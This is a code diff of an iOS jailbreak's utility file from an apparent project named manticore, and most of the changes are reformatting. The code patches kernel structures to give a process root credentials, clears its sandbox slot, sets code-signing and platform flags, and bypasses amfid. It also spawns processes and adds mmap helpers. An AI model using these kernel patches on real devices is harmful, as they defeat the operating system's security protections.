@@ -5,71 +5,71 @@
 //  Created by Luca on 18.02.21.
 //
 
-#import <Foundation/Foundation.h>
 #include <CoreFoundation/CoreFoundation.h>
-#include <mach/error.h>
+#import <Foundation/Foundation.h>
 #include <Security/Security.h>
-#include <mach/mach.h>
-#include <Security/Security.h>
-#include <xnu/bsd/sys/proc_info.h>
-#include <xnu/libsyscall/wrappers/libproc/libproc.h>
 #include <exploit/cicuta/cicuta_virosa.h>
+#include <mach/error.h>
+#include <mach/mach.h>
 #include <manticore/kernel_utils.h>
-#include <unistd.h>
 #include <manticore/utils.h>
 #import <spawn.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <xnu/bsd/sys/proc_info.h>
+#include <xnu/libsyscall/wrappers/libproc/libproc.h>
 
-#include <lib/tq/tq_common_p.h>
-#include <lib/tq/utils.h>
+#include <lib/tq/k_offsets.h>
 #include <lib/tq/k_utils.h>
 #include <lib/tq/kapi.h>
-#include <lib/tq/k_offsets.h>
+#include <lib/tq/tq_common_p.h>
+#include <lib/tq/utils.h>
 
 #include "k_offsets.h"
 #include <util/alloc.h>
 
 extern char **environ;
-NSData *lastSystemOutput=nil;
+NSData *lastSystemOutput = nil;
 
-int perform_root_patches(kptr_t ucred){
+int perform_root_patches(kptr_t ucred) {
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
-    
+
     /* CR_UID */
+    // todo: use kapi
     uint64_t old_uid = read_64(ucred + OFFSET(ucred, cr_uid));
-    write_20(ucred + OFFSET(ucred, cr_uid), (void*)buffer);
+    write_20(ucred + OFFSET(ucred, cr_uid), (void *)buffer);
     uint64_t new_uid = read_64(ucred + OFFSET(ucred, cr_uid));
-    if(old_uid == new_uid) return 1;
-//
-//    /* CR_RUID */
-//    uint64_t old_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
-//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID, (void*)buffer);
-//    uint64_t new_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
-//    if(old_ruid == new_ruid) return 1;
-//
-//    /* CR_SVGID */
-//    uint64_t old_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
-//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID, (void*)buffer);
-//    uint64_t new_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
-//    if(old_svgid == new_svgid) return 1;
-//
-//    /* CR_SVUID */
-//    uint64_t old_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
-//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID, (void*)buffer);
-//    uint64_t new_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
-//    if(old_svuid == new_svuid) return 1;
-    
-    
-    
+    if (old_uid == new_uid)
+        return 1;
+    //
+    //    /* CR_RUID */
+    //    uint64_t old_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
+    //    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID, (void*)buffer);
+    //    uint64_t new_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
+    //    if(old_ruid == new_ruid) return 1;
+    //
+    //    /* CR_SVGID */
+    //    uint64_t old_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
+    //    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID, (void*)buffer);
+    //    uint64_t new_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
+    //    if(old_svgid == new_svgid) return 1;
+    //
+    //    /* CR_SVUID */
+    //    uint64_t old_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
+    //    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID, (void*)buffer);
+    //    uint64_t new_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
+    //    if(old_svuid == new_svuid) return 1;
+
     return 0;
 }
 
-
-void patch_amfid(pid_t amfid_pid){
+void patch_amfid(pid_t amfid_pid) {
     printf("* ------ AMFID Bypass ------ *\n");
     kptr_t amfid_kernel_proc = kproc_find_by_pid(amfid_pid);
     printf("amfid proc:\t%d\t->\t0x%llx\n", amfid_pid, amfid_kernel_proc);
     printf("amfid task:\t0x%llx\n", amfid_kernel_proc + OFFSET(proc, task));
-    if(setCSFlagsByPID(amfid_pid)){
+    if (setCSFlagsByPID(amfid_pid)) {
         printf("Successfully set Amfid's CSFlags.\n");
     } else {
         printf("Unable to set Amfid's csflags.\n");
@@ -78,7 +78,8 @@ void patch_amfid(pid_t amfid_pid){
 
 bool set_csflags(kptr_t proc, uint32_t flags, bool value) {
     bool ret = false;
-    if(!KERN_POINTER_VALID(proc)) return 0;
+    if (!KERN_POINTER_VALID(proc))
+        return 0;
     kptr_t proc_csflags_addr = proc + 0x280;
     uint32_t csflags = read_32(proc_csflags_addr);
     if (value == true) {
@@ -86,15 +87,17 @@ bool set_csflags(kptr_t proc, uint32_t flags, bool value) {
     } else {
         csflags &= ~flags;
     }
-  //  write_32(proc_csflags_addr, (void*)csflags);
+    //  write_32(proc_csflags_addr, (void*)csflags);
     ret = true;
     return ret;
 }
 
 bool set_cs_platform_binary(kptr_t proc, bool value) {
     bool ret = false;
-    if(!KERN_POINTER_VALID(proc)) return 0;
-    if(!set_csflags(proc, 0x4000000, value)) return 0;
+    if (!KERN_POINTER_VALID(proc))
+        return 0;
+    if (!set_csflags(proc, 0x4000000, value))
+        return 0;
     ret = true;
     return ret;
 }
@@ -102,31 +105,38 @@ bool set_cs_platform_binary(kptr_t proc, bool value) {
 bool patch_TF_PLATFORM(kptr_t task) {
     uint32_t t_flags = 0;
     uint32_t t_flags_mod = 0;
-    if(KERN_POINTER_VALID(task)){
+    if (KERN_POINTER_VALID(task)) {
         uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
         uint32_t t_flags_mod = t_flags;
-        if(g_exp.debug) printf("--> tf_flags:\t%#x |", t_flags);
+        if (g_exp.debug)
+            printf("--> tf_flags:\t%#x |", t_flags);
         t_flags |= 0x00000400;
         kapi_write32(task + OFFSET(task, t_flags), t_flags);
         t_flags_mod = kapi_read32(task + OFFSET(task, t_flags));
-        if(g_exp.debug) printf(" %#x\n", t_flags_mod);
-        if(t_flags_mod != t_flags || t_flags_mod > 0x00000400) return true;
-    } else printf("Can't patch tf_platform of invalid task/kernel_pointer!\n");
-    printf("Setting tf_platform failed!\t(%#x <-> %#x)\n", t_flags, t_flags_mod);
+        if (g_exp.debug)
+            printf(" %#x\n", t_flags_mod);
+        if (t_flags_mod != t_flags || t_flags_mod > 0x00000400)
+            return true;
+    } else {
+        printf("Can't patch tf_platform of invalid task/kernel_pointer!\n");
+    }
+    printf("Setting tf_platform failed!\t(%#x <-> %#x)\n", t_flags,
+           t_flags_mod);
     return false;
 }
 
-
-pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want)){
+pid_t look_for_proc_internal(const char *name,
+                             bool (^match)(const char *path,
+                                           const char *want)) {
     pid_t *pids = (pid_t *)calloc(1, 3000 * sizeof(pid_t));
     int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
-    if(procs_cnt > 3000) {
+    if (procs_cnt > 3000) {
         pids = (pid_t *)realloc(pids, procs_cnt * sizeof(pid_t));
         procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
     }
     int len;
     char pathBuffer[4096];
-    for (int i=(procs_cnt-1); i>=0; i--) {
+    for (int i = (procs_cnt - 1); i >= 0; i--) {
         if (pids[i] == 0) {
             continue;
         }
@@ -144,27 +154,29 @@ pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, c
     return 0;
 }
 
-pid_t look_for_proc(const char *proc_name){
-    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
-        if (!strcmp(path, want)) {
-            return true;
-        }
-        return false;
-    });
+pid_t look_for_proc(const char *proc_name) {
+    return look_for_proc_internal(proc_name,
+                                  ^bool(const char *path, const char *want) {
+                                    if (!strcmp(path, want)) {
+                                        return true;
+                                    }
+                                    return false;
+                                  });
 }
 
-pid_t look_for_proc_basename(const char *base_name){
-    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
-        const char *base = path;
-        const char *last = strrchr(path, '/');
-        if (last) {
-            base = last + 1;
-        }
-        if (!strcmp(base, want)) {
-            return true;
-        }
-        return false;
-    });
+pid_t look_for_proc_basename(const char *base_name) {
+    return look_for_proc_internal(base_name,
+                                  ^bool(const char *path, const char *want) {
+                                    const char *base = path;
+                                    const char *last = strrchr(path, '/');
+                                    if (last) {
+                                        base = last + 1;
+                                    }
+                                    if (!strcmp(base, want)) {
+                                        return true;
+                                    }
+                                    return false;
+                                  });
 }
 
 void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred) {
@@ -175,7 +187,7 @@ void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred) {
     size_t cred_size = SIZE(posix_cred);
     char zero_cred[cred_size];
     struct proc_cred *cred_label;
-    if(cred_size > sizeof(cred_label->posix_cred)){
+    if (cred_size > sizeof(cred_label->posix_cred)) {
         printf("Error:\tstruct proc_cred should be bigger");
         exit(0);
     }
@@ -186,7 +198,8 @@ void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred) {
     cred_label->sandbox_slot = 0;
 
     if (cred_label->cr_label) {
-        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
+        kptr_t cr_label =
+            cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
         cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
         kapi_write64(cr_label + 0x10, 0x0);
     }
@@ -248,18 +261,21 @@ bool restartSpringBoard(void) {
     return true;
 }
 
-
-BOOL setCSFlagsByPID(pid_t pid){
-    if(!pid) return NO;
-    kptr_t proc_proc  = kproc_find_by_pid(pid);
-    uint32_t csflags  = kapi_read32(proc_proc + OFFSET(proc, csflags));
-    uint32_t newflags = (csflags | 0x4000000 | 0x0000008 | 0x0000004 | 0x10000000) & ~(0x0000800 | 0x0000100 | 0x0000200);
+BOOL setCSFlagsByPID(pid_t pid) {
+    if (!pid)
+        return NO;
+    kptr_t proc_proc = kproc_find_by_pid(pid);
+    uint32_t csflags = kapi_read32(proc_proc + OFFSET(proc, csflags));
+    uint32_t newflags =
+        (csflags | 0x4000000 | 0x0000008 | 0x0000004 | 0x10000000) &
+        ~(0x0000800 | 0x0000100 | 0x0000200);
     kapi_write32(proc_proc + OFFSET(proc, csflags), newflags);
-    return (kapi_read32(proc_proc + OFFSET(proc, csflags)) == newflags) ? YES : NO;
+    return (kapi_read32(proc_proc + OFFSET(proc, csflags)) == newflags) ? YES
+                                                                        : NO;
 }
 
-
-int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unrestrict)(pid_t), bool wait, bool quiet) {
+int runCommandv(const char *cmd, int argc, const char *const *argv,
+                void (^unrestrict)(pid_t), bool wait, bool quiet) {
     pid_t pid;
     posix_spawn_file_actions_t *actions = NULL;
     posix_spawn_file_actions_t actionsStruct;
@@ -267,53 +283,60 @@ int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unre
     bool valid_pipe = false;
     posix_spawnattr_t *attr = NULL;
     posix_spawnattr_t attrStruct;
-    
-    NSMutableString *cmdstr = [NSMutableString stringWithCString:cmd encoding:NSUTF8StringEncoding];
-    for (int i=1; i<argc; i++) {
+
+    NSMutableString *cmdstr =
+        [NSMutableString stringWithCString:cmd encoding:NSUTF8StringEncoding];
+    for (int i = 1; i < argc; i++) {
         [cmdstr appendFormat:@" \"%s\"", argv[i]];
     }
 
     valid_pipe = pipe(out_pipe) == ERR_SUCCESS;
-    if (valid_pipe && posix_spawn_file_actions_init(&actionsStruct) == ERR_SUCCESS) {
+    if (valid_pipe &&
+        posix_spawn_file_actions_init(&actionsStruct) == ERR_SUCCESS) {
         actions = &actionsStruct;
         posix_spawn_file_actions_adddup2(actions, out_pipe[1], 1);
         posix_spawn_file_actions_adddup2(actions, out_pipe[1], 2);
         posix_spawn_file_actions_addclose(actions, out_pipe[0]);
         posix_spawn_file_actions_addclose(actions, out_pipe[1]);
     }
-    
+
     if (unrestrict && posix_spawnattr_init(&attrStruct) == ERR_SUCCESS) {
         attr = &attrStruct;
         posix_spawnattr_setflags(attr, POSIX_SPAWN_START_SUSPENDED);
     }
-    
+
     char *dt_mode = getenv("OS_ACTIVITY_DT_MODE");
     if (dt_mode) {
-        dt_mode = strdup(dt_mode); // I didn't check for failure because that will just permanently unset DT_MODE
-        unsetenv("OS_ACTIVITY_DT_MODE"); // This causes all NSLog entries go to STDERR and breaks firmware.sh
+        dt_mode = strdup(dt_mode); // I didn't check for failure because that
+                                   // will just permanently unset DT_MODE
+        unsetenv("OS_ACTIVITY_DT_MODE"); // This causes all NSLog entries go to
+                                         // STDERR and breaks firmware.sh
     }
-    
 
-    int rv = posix_spawn(&pid, cmd, actions, attr, (char *const *)argv, environ);
+    int rv =
+        posix_spawn(&pid, cmd, actions, attr, (char *const *)argv, environ);
 
     if (dt_mode) {
         setenv("OS_ACTIVITY_DT_MODE", dt_mode, 1);
         free(dt_mode);
     }
 
-    if(quiet != true) printf("%s(%d) command: %s\n", __FUNCTION__, pid, [cmdstr UTF8String]);
-    
+    if (quiet != true)
+        printf("%s(%d) command: %s\n", __FUNCTION__, pid, [cmdstr UTF8String]);
+
     if (unrestrict) {
         unrestrict(pid);
         kill(pid, SIGCONT);
     }
-    
+
     if (valid_pipe) {
         close(out_pipe[1]);
     }
-    
+
     if (rv != ERR_SUCCESS) {
-        if(quiet != true) printf("%s(%d): ERROR posix_spawn failed (%d): %s\n", __FUNCTION__, pid, rv, strerror(rv));
+        if (quiet != true)
+            printf("%s(%d): ERROR posix_spawn failed (%d): %s\n", __FUNCTION__,
+                   pid, rv, strerror(rv));
         rv <<= 8; // Put error into WEXITSTATUS
     } else if (wait) {
         if (valid_pipe) {
@@ -324,7 +347,9 @@ int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unre
             while (read(out_pipe[0], &c, 1) == 1) {
                 [outData appendBytes:&c length:1];
                 if (c == '\n') {
-                    if(quiet != true) printf("%s(%d): %s\n", __FUNCTION__, pid, [line UTF8String]);
+                    if (quiet != true)
+                        printf("%s(%d): %s\n", __FUNCTION__, pid,
+                               [line UTF8String]);
                     [line setString:@""];
                 } else {
                     s[0] = c;
@@ -335,14 +360,19 @@ int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unre
                 }
             }
             if ([line length] > 0) {
-                if(quiet != true) printf("%s(%d): %s\n", __FUNCTION__, pid, [line UTF8String]);
+                if (quiet != true)
+                    printf("%s(%d): %s\n", __FUNCTION__, pid,
+                           [line UTF8String]);
             }
             lastSystemOutput = [outData copy];
         }
         if (waitpid(pid, &rv, 0) == -1) {
-            if(quiet != true) printf("ERROR: Waitpid failed\n");
+            if (quiet != true)
+                printf("ERROR: Waitpid failed\n");
         } else {
-            if(quiet != true) printf("%s(%d) completed with exit status %d\n", __FUNCTION__, pid, WEXITSTATUS(rv));
+            if (quiet != true)
+                printf("%s(%d) completed with exit status %d\n", __FUNCTION__,
+                       pid, WEXITSTATUS(rv));
         }
     }
     if (valid_pipe) {
@@ -351,75 +381,86 @@ int runCommandv(const char *cmd, int argc, const char * const* argv, void (^unre
     return rv;
 }
 
-void patch_tf_platform(uint64_t target_task){
+void patch_tf_platform(uint64_t target_task) {
     uint32_t old_t_flags = read_32(target_task + OFFSET(task, t_flags));
     old_t_flags |= 0x00000400; // TF_PLATFORM
 }
 
 typedef CF_OPTIONS(uint32_t, SecCSFlags) {
-    kSecCSDefaultFlags = 0,                    /* no particular flags (default behavior) */
-    kSecCSConsiderExpiration = (NSUInteger)1 << 31,        /* consider expired certificates invalid */
+    kSecCSDefaultFlags = 0, /* no particular flags (default behavior) */
+    kSecCSConsiderExpiration =
+        (NSUInteger)1 << 31, /* consider expired certificates invalid */
 };
 
 typedef void *SecStaticCodeRef;
-extern "C" OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef  _Nullable *staticCode);
-extern "C" OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef  _Nullable *information);
-CFStringRef (*_SecCopyErrorMessageString)(OSStatus status, void * __nullable reserved) = NULL;
-enum cdHashType {
-    cdHashTypeSHA1 = 1,
-    cdHashTypeSHA256 = 2
-};
+extern "C" OSStatus SecStaticCodeCreateWithPathAndAttributes(
+    CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes,
+    SecStaticCodeRef _Nullable *staticCode);
+extern "C" OSStatus
+SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags,
+                              CFDictionaryRef _Nullable *information);
+CFStringRef (*_SecCopyErrorMessageString)(OSStatus status,
+                                          void *__nullable reserved) = NULL;
+enum cdHashType { cdHashTypeSHA1 = 1, cdHashTypeSHA256 = 2 };
 
 static char *cdHashName[3] = {NULL, "SHA1", "SHA256"};
 static enum cdHashType requiredHash = cdHashTypeSHA256;
 
-const void *CFArrayGetValueAtIndex_prevenOverFlow(CFArrayRef theArray, CFIndex idx){
+const void *CFArrayGetValueAtIndex_prevenOverFlow(CFArrayRef theArray,
+                                                  CFIndex idx) {
     CFIndex arrCnt = CFArrayGetCount(theArray);
-    if(idx >= arrCnt){
+    if (idx >= arrCnt) {
         idx = arrCnt - 1;
     }
     return CFArrayGetValueAtIndex(theArray, idx);
 }
 
-
-void *CDHashFor(char *file){
+void *CDHashFor(char *file) {
     SecStaticCodeRef staticCode = NULL;
-    CFStringRef cfstr_path = CFStringCreateWithCString(kCFAllocatorDefault, file, kCFStringEncodingUTF8);
-    CFURLRef cfurl = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, cfstr_path, kCFURLPOSIXPathStyle, false);
+    CFStringRef cfstr_path = CFStringCreateWithCString(
+        kCFAllocatorDefault, file, kCFStringEncodingUTF8);
+    CFURLRef cfurl = CFURLCreateWithFileSystemPath(
+        kCFAllocatorDefault, cfstr_path, kCFURLPOSIXPathStyle, false);
     CFRelease(cfstr_path);
-    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(cfurl, kSecCSDefaultFlags, NULL, &staticCode);
+    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(
+        cfurl, kSecCSDefaultFlags, NULL, &staticCode);
     CFRelease(cfurl);
     if (result != 0) {
         if (_SecCopyErrorMessageString != NULL) {
             CFStringRef error = _SecCopyErrorMessageString(result, NULL);
-            
-            (printf)("Unable to generate cdhash for %s: %s\n", file, CFStringGetCStringPtr(error, kCFStringEncodingUTF8));
+
+            (printf)("Unable to generate cdhash for %s: %s\n", file,
+                     CFStringGetCStringPtr(error, kCFStringEncodingUTF8));
             CFRelease(error);
         } else {
             (printf)("Unable to generate cdhash for %s: %d\n", file, result);
         }
         return nil;
     }
-    
+
     CFDictionaryRef signinginfo;
-    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags, &signinginfo);
+    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags,
+                                           &signinginfo);
     CFRelease(staticCode);
     if (result != 0) {
         (printf)("Unable to copy cdhash info for %s\n", file);
         return NULL;
     }
-    
-    CFArrayRef cdhashes = (CFArrayRef)CFDictionaryGetValue(signinginfo, CFSTR("cdhashes"));
-    CFArrayRef algos = (CFArrayRef)CFDictionaryGetValue(signinginfo, CFSTR("digest-algorithms"));
+
+    CFArrayRef cdhashes =
+        (CFArrayRef)CFDictionaryGetValue(signinginfo, CFSTR("cdhashes"));
+    CFArrayRef algos = (CFArrayRef)CFDictionaryGetValue(
+        signinginfo, CFSTR("digest-algorithms"));
     int algoIndex = -1;
-    CFNumberRef nn = (CFNumberRef)CFArrayGetValueAtIndex_prevenOverFlow(algos, requiredHash);
-    if(nn){
+    CFNumberRef nn =
+        (CFNumberRef)CFArrayGetValueAtIndex_prevenOverFlow(algos, requiredHash);
+    if (nn) {
         CFNumberGetValue(nn, kCFNumberIntType, &algoIndex);
     }
-    
+
     (printf)("cdhashesCnt: %d\n", CFArrayGetCount(cdhashes));
     (printf)("algosCnt: %d\n", CFArrayGetCount(algos));
-    
+
     CFDataRef cdhash = NULL;
     if (cdhashes == NULL) {
         (printf)("%s: no cdhashes\n", file);
@@ -428,16 +469,18 @@ void *CDHashFor(char *file){
     } else if (algoIndex == -1) {
         (printf)("%s: does not have %s hash", cdHashName[requiredHash], file);
     } else {
-        cdhash = (CFDataRef)CFArrayGetValueAtIndex_prevenOverFlow(cdhashes, requiredHash);
+        cdhash = (CFDataRef)CFArrayGetValueAtIndex_prevenOverFlow(cdhashes,
+                                                                  requiredHash);
         if (cdhash == NULL) {
-            (printf)("%s: missing %s cdhash entry\n", file, cdHashName[requiredHash]);
+            (printf)("%s: missing %s cdhash entry\n", file,
+                     cdHashName[requiredHash]);
         }
     }
-    if(cdhash == NULL){
+    if (cdhash == NULL) {
         CFRelease(signinginfo);
         return NULL;
     }
-    
+
     (printf)("cdhash len: %d\n", CFDataGetLength(cdhash));
     char *rv = (char *)calloc(1, 20);
     memcpy(rv, CFDataGetBytePtr(cdhash), 20);
@@ -469,7 +512,7 @@ bool isMountpoint(const char *filename) {
 
     if (!S_ISDIR(buf.st_mode))
         return false;
-    
+
     char *cwd = getcwd(NULL, 0);
     int rv = chdir(filename);
     assert(rv == ERR_SUCCESS);
@@ -485,7 +528,8 @@ bool isMountpoint(const char *filename) {
 
 bool deleteFile(const char *file) {
     NSString *path = @(file);
-    if ([[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil]) {
+    if ([[NSFileManager defaultManager] attributesOfItemAtPath:path
+                                                         error:nil]) {
         return [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
     }
     return YES;
@@ -495,12 +539,10 @@ bool ensureDirectory(const char *directory, int owner, mode_t mode) {
     NSString *path = @(directory);
     NSFileManager *fm = [NSFileManager defaultManager];
     id attributes = [fm attributesOfItemAtPath:path error:nil];
-    if (attributes &&
-        [attributes[NSFileType] isEqual:NSFileTypeDirectory] &&
+    if (attributes && [attributes[NSFileType] isEqual:NSFileTypeDirectory] &&
         [attributes[NSFileOwnerAccountID] isEqual:@(owner)] &&
         [attributes[NSFileGroupOwnerAccountID] isEqual:@(owner)] &&
-        [attributes[NSFilePosixPermissions] isEqual:@(mode)]
-        ) {
+        [attributes[NSFilePosixPermissions] isEqual:@(mode)]) {
         // Directory exists and matches arguments
         return true;
     }
@@ -508,21 +550,26 @@ bool ensureDirectory(const char *directory, int owner, mode_t mode) {
         if ([attributes[NSFileType] isEqual:NSFileTypeDirectory]) {
             // Item exists and is a directory
             return [fm setAttributes:@{
-                           NSFileOwnerAccountID: @(owner),
-                           NSFileGroupOwnerAccountID: @(owner),
-                           NSFilePosixPermissions: @(mode)
-                           } ofItemAtPath:path error:nil];
+                NSFileOwnerAccountID : @(owner),
+                NSFileGroupOwnerAccountID : @(owner),
+                NSFilePosixPermissions : @(mode)
+            }
+                        ofItemAtPath:path
+                               error:nil];
         } else if (![fm removeItemAtPath:path error:nil]) {
             // Item exists and is not a directory but could not be removed
             return false;
         }
     }
     // Item does not exist at this point
-    return [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:@{
-                   NSFileOwnerAccountID: @(owner),
-                   NSFileGroupOwnerAccountID: @(owner),
-                   NSFilePosixPermissions: @(mode)
-               } error:nil];
+    return [fm createDirectoryAtPath:path
+         withIntermediateDirectories:YES
+                          attributes:@{
+                              NSFileOwnerAccountID : @(owner),
+                              NSFileGroupOwnerAccountID : @(owner),
+                              NSFilePosixPermissions : @(mode)
+                          }
+                               error:nil];
 }
 
 bool ensureSymlink(const char *to, const char *from) {
@@ -531,8 +578,7 @@ bool ensureSymlink(const char *to, const char *from) {
     char link[maxLen];
     ssize_t linkLength = readlink(from, link, sizeof(link));
     if (linkLength != wantedLength ||
-        strncmp(link, to, maxLen) != ERR_SUCCESS
-        ) {
+        strncmp(link, to, maxLen) != ERR_SUCCESS) {
         if (!deleteFile(from)) {
             return false;
         }
@@ -547,12 +593,10 @@ bool ensureFile(const char *file, int owner, mode_t mode) {
     NSString *path = @(file);
     NSFileManager *fm = [NSFileManager defaultManager];
     id attributes = [fm attributesOfItemAtPath:path error:nil];
-    if (attributes &&
-        [attributes[NSFileType] isEqual:NSFileTypeRegular] &&
+    if (attributes && [attributes[NSFileType] isEqual:NSFileTypeRegular] &&
         [attributes[NSFileOwnerAccountID] isEqual:@(owner)] &&
         [attributes[NSFileGroupOwnerAccountID] isEqual:@(owner)] &&
-        [attributes[NSFilePosixPermissions] isEqual:@(mode)]
-        ) {
+        [attributes[NSFilePosixPermissions] isEqual:@(mode)]) {
         // File exists and matches arguments
         return true;
     }
@@ -560,34 +604,38 @@ bool ensureFile(const char *file, int owner, mode_t mode) {
         if ([attributes[NSFileType] isEqual:NSFileTypeRegular]) {
             // Item exists and is a file
             return [fm setAttributes:@{
-                                       NSFileOwnerAccountID: @(owner),
-                                       NSFileGroupOwnerAccountID: @(owner),
-                                       NSFilePosixPermissions: @(mode)
-                                       } ofItemAtPath:path error:nil];
+                NSFileOwnerAccountID : @(owner),
+                NSFileGroupOwnerAccountID : @(owner),
+                NSFilePosixPermissions : @(mode)
+            }
+                        ofItemAtPath:path
+                               error:nil];
         } else if (![fm removeItemAtPath:path error:nil]) {
             // Item exists and is not a file but could not be removed
             return false;
         }
     }
     // Item does not exist at this point
-    return [fm createFileAtPath:path contents:nil attributes:@{
-                               NSFileOwnerAccountID: @(owner),
-                               NSFileGroupOwnerAccountID: @(owner),
-                               NSFilePosixPermissions: @(mode)
-                               }];
+    return [fm createFileAtPath:path
+                       contents:nil
+                     attributes:@{
+                         NSFileOwnerAccountID : @(owner),
+                         NSFileGroupOwnerAccountID : @(owner),
+                         NSFilePosixPermissions : @(mode)
+                     }];
 }
 
-
-void jailbreakExistenceCheck(){
+void jailbreakExistenceCheck() {
     // Check for files that indicate the existence of another jailbreak
-    
+
     // Check for taurine related files
-    if(isDirectory("/taurine") && access("/taurine/amfidebilitate.plist", O_RDONLY)){
+    if (isDirectory("/taurine") &&
+        access("/taurine/amfidebilitate.plist", O_RDONLY)) {
         printf("-> Spotted taurine files\n");
     }
-    
+
     // Check for unc0ver related files
-    if(access("/.installed_unc0ver", O_RDONLY)){
+    if (access("/.installed_unc0ver", O_RDONLY)) {
         printf("-> Spotted unc0ver files\n");
     }
 }
@@ -599,4 +647,62 @@ int waitForFile(const char *filename) {
         rv = access(filename, F_OK);
     }
     return rv;
+}
+
+bool runningAsRoot() { return getuid() == 0; }
+
+bool manticoreMmapFile(const char *const path,
+                       struct manticore_mapped_file *file) {
+    MANTICORE_THROW_ON_NULL(path);
+    MANTICORE_THROW_ON_NULL(file);
+
+    // in case the caller gives us uninitialized data
+    file->size = 0;
+    file->ptr = NULL;
+
+    FILE *f = NULL;
+    f = fopen(path, "r");
+    if (f == NULL) {
+        manticoreError("Could not open file for reading: %s", path);
+        return false;
+    }
+
+    // get file size
+    if (fseek(f, 0, SEEK_END)) {
+        manticoreError("Could not seek to end of file (is it a FIFO, pipe, or "
+                       "socket?): %s",
+                       path);
+        fclose(f);
+        return false;
+    }
+
+    file->size = ftello(f);
+    if (file->size < 0) {
+        manticoreError("Could not report file position (is it a FIFO, pipe, or "
+                       "socket?) [should never reach]: %s",
+                       path);
+        fclose(f);
+        return false;
+    }
+
+    // map into memory
+    file->ptr = mmap(0, file->size, PROT_READ, MAP_PRIVATE, fileno(f), 0);
+    if (file->ptr == MAP_FAILED) {
+        manticoreError("Could not mmap file into memory: %s", strerror(errno));
+        fclose(f);
+        return false;
+    }
+
+    // clean up
+    fclose(f);
+
+    return true;
+}
+
+void manticoreMunmapFile(struct manticore_mapped_file *file) {
+    MANTICORE_THROW_ON_NULL(file);
+    MANTICORE_THROW_ON_NULL(file->ptr);
+    MANTICORE_THROW_ON_FALSE(file->size > 0);
+
+    munmap(file->ptr, file->size);
 }
